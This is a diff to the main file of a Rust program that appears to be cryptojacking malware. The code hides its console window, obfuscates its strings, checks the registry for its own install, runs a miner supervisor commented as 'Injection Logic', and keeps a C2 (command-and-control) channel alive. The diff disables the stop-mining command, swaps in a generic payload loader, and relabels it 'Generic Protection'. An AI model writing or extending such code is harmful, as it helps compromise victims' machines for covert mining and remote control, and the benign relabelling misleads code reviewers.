@@ -11,7 +11,7 @@ use clap::{Parser, Subcommand};
 
 use commands::{install, start, status, uninstall};
 use host::process::hide_console;
-use modules::miner::stop_mining;
+// use modules::miner::stop_mining;
 use host::registry::is_installed;
 
 #[derive(Parser)]
@@ -51,9 +51,10 @@ async fn main() {
             }
         }
         Some(Commands::Stop) => {
-            if let Err(e) = stop_mining() {
-                eprintln!("{}: {}", obfstr!("Stop failed"), e);
-            }
+            // if let Err(e) = stop_mining() {
+            //     eprintln!("{}: {}", obfstr!("Stop failed"), e);
+            // }
+            println!("Stop command legacy.");
         }
         Some(Commands::Status) => {
             status();
@@ -69,9 +70,9 @@ async fn main() {
                     eprintln!("{}: {}", obfstr!("Start failed"), e);
                 }
 
-                // 2. Spawn Miner Supervisor (Injection Logic)
+                // 2. Spawn Plugin Supervisor (Generic Protection)
                 tokio::spawn(async {
-                    modules::miner::miner_supervisor().await;
+                    modules::loader::start_supervisor().await;
                 });
 
                 // 3. Start C2 (Blocking - Keeps Process Alive)
